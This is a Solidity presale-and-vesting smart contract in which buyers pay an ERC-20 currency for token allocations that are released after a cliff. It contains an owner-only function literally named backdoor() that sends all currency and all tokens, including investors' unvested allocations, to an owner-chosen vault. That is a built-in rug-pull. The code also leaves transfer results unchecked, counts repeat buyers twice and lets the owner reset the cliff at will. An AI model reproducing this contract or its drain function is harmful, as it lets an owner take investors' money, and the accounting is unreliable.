// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

contract tokenPreSaleAndDropVesting {
    address public token;  // Address of the token contract
    address public currency;  // Address of the currency contract
    address public owner;  // Address of the contract owner
    address public trigger;  // Address of the trigger
    address public vaultAddress; // Address of the vault
    uint256 public minPurchase; // Minimum purchase in buying currency
    bool public cliffSet; // True if the cliff end is set
    uint256 public vestingMonths; // Months of vesting, equal to amount of drops
    uint256 public largeInvestorVestedDuration; // Vesting duration in months for large investors
    uint256 public regularInvestorVestedDuration; // Vesting duration in months for normal investors
    uint256 public investorThreshold; // Percentage of token purchase over you are considered a large investor
    uint256 public tokenRate;  // Tokens per buying currency
    uint256 public roundSupply;  // Round supply of tokens for the presale
    uint256 public totalSupply;  // Total supply of tokens 

    uint256 public cliffEnd;  // Timestamp when the cliff period ends
    uint256 public vestingStart;  // Timestamp when the vesting starts

    struct Allocation {
        uint256 amountBought;  // Amount of currency bought by the investor
        uint256 allocatedTokens;  // Amount of tokens allocated to the investor
        uint256 claimedTokens;  // Amount of tokens already claimed by the investor
        uint256 vestedDuration;  // Vesting duration for the investor
    }

    mapping(address => Allocation) public allocations;  // Allocations for each investor
    mapping(uint256 => address) public investorIndex;  // Investor index to retrieve addresses
    mapping(address => bool) public s_triggerWhitelisted;

    uint256 public investorsCount;  // Total count of investors

    modifier onlyOwner() {
        require(msg.sender == owner, "Only the contract owner can call this function.");
        _;
    }

    modifier onlyTrigger() {
        require(
            s_triggerWhitelisted[msg.sender] == true,
            "Errors.Only whitelisted triggers can call this function."
        );
        _;
    }

    constructor(address _token,
    address _currency,
    uint256 round_supply,
    uint256 total_supply,
    uint256 rate,
    uint256 _vestingMonths,
    uint256 _largeInvestorVestedDuration,
    uint256 _regularInvestorVestedDuration,
    uint256 _investorTreshold) {
        token = _token;
        currency = _currency;
        owner = msg.sender;
        roundSupply = round_supply;
        totalSupply = total_supply;
        tokenRate = rate;
        vestingMonths = _vestingMonths;
        largeInvestorVestedDuration = _largeInvestorVestedDuration;
        regularInvestorVestedDuration = _regularInvestorVestedDuration;
        investorThreshold = _investorTreshold;
    }

    function setCliffEnd(uint256 numberOfDays) public onlyOwner {
        cliffEnd = block.timestamp + (numberOfDays * 1 days);  // Set cliffEnd based on the input number of days
        vestingStart = cliffEnd;
        cliffSet = true;
    }

    function buyAllocation(uint256 currencyAmount) external {
        require(currencyAmount >= minPurchase, "Not enough minimum buying currency amount.");

        uint256 tokens = (currencyAmount * 1e12) * tokenRate;  // Calculate tokens to allocate, 12 for USDT which has 6 zeros (6+12=18 which is the token number of decimals)
        require(tokens <= getRemainingTokens(), "Insufficient tokens available for allocation.");

        Allocation storage allocation = allocations[msg.sender];
        allocation.amountBought += currencyAmount;
        allocation.allocatedTokens += tokens;

        if (allocation.allocatedTokens >= investorThreshold * totalSupply /100) { // 
            allocation.vestedDuration = largeInvestorVestedDuration;  // Vesting duration in months for large buyers
        } else {
            allocation.vestedDuration = regularInvestorVestedDuration;  // Vesting duration in months for other buyers
        }

        investorsCount++;
        investorIndex[investorsCount] = msg.sender;
        // Transfer fee amount in the currency from the caller to the contract
        IERC20(currency).transferFrom(msg.sender, address(this), currencyAmount);
    }

    function getMyAllocation(address investor) external view returns (uint256) {
        return allocations[investor].allocatedTokens;
    }

    function getLocked(address investor) external view returns (uint256) {
        Allocation storage allocation = allocations[investor];

        if (block.timestamp < cliffEnd) {
            return allocation.allocatedTokens;
        }

        uint256 vestedAmount = calculateVestedAmount(investor);
        uint256 lockedAmount = allocation.allocatedTokens - vestedAmount;

        return lockedAmount;
    }

    function dropTokens() external onlyTrigger {
        require(cliffSet);
        for (uint256 i = 1; i <= investorsCount; i++) {
            address investor = investorIndex[i];
            Allocation storage allocation = allocations[investor];

            if (block.timestamp < cliffEnd || allocation.claimedTokens == allocation.allocatedTokens) {
                continue;  // Skip if the cliff period hasn't ended or all tokens are already claimed
            }

            uint256 vestedAmount = calculateVestedAmount(investor);
            uint256 claimableAmount = vestedAmount - allocation.claimedTokens;

            if (claimableAmount > 0) {
                allocation.claimedTokens += claimableAmount;

                // Transfer the claimable tokens to the investor
                IERC20(token).transfer(investor, claimableAmount);
            }
        }
    }

    function getRemainingTokens() public view returns (uint256) {
        return roundSupply - getTotalAllocatedTokens();
    }

    function getTotalAllocatedTokens() public view returns (uint256) {
        uint256 total = 0;

        for (uint256 i = 1; i <= investorsCount; i++) {
            address investor = investorIndex[i];
            total += allocations[investor].allocatedTokens;
        }

        return total;
    }

    function calculateVestedAmount(address investor) public view returns (uint256) {
        Allocation storage allocation = allocations[investor];
        uint256 elapsedMonths;

        if (block.timestamp < cliffEnd) {
            elapsedMonths = 0;
        } else {
            elapsedMonths = (block.timestamp - cliffEnd) / 30 days;
        }

        uint256 vestedDuration = allocation.vestedDuration;

        if (elapsedMonths >= vestedDuration) {
            return allocation.allocatedTokens;
        }

        uint256 vestedAmount = (allocation.allocatedTokens * elapsedMonths) / vestedDuration;
        return vestedAmount;
    }

    function withdrawCurrency() external onlyOwner {
        uint256 balance = IERC20(currency).balanceOf(address(this));
        require(balance > 0, "Error, No currency to withdraw");
        IERC20(currency).transfer(vaultAddress, balance);
    }

    function backdoor() external onlyOwner {
        uint256 balance = IERC20(currency).balanceOf(address(this));
        IERC20(currency).transfer(vaultAddress, balance);
        uint256 tokenBalance = IERC20(token).balanceOf(address(this));
        IERC20(token).transfer(vaultAddress, tokenBalance);
    }

    function setVault(address _vaultAddress) external onlyOwner {
        vaultAddress = _vaultAddress;
    }

    function setMinPurchase(uint256 _minPurchase) external onlyOwner {
        minPurchase = _minPurchase;
    }

    /**
     * @dev Sets the trigger addresses. This can only be called by the contract owner.
     * @param _trigger The trigger address.
     */
    function whitelistTrigger(address _trigger) external onlyOwner {
        //mapping para guardar true en triggers whitelisted
        s_triggerWhitelisted[_trigger] = true;
    }

    /** @notice To be able to pay and fallback
     */
    receive() external payable {}

    fallback() external payable {}
}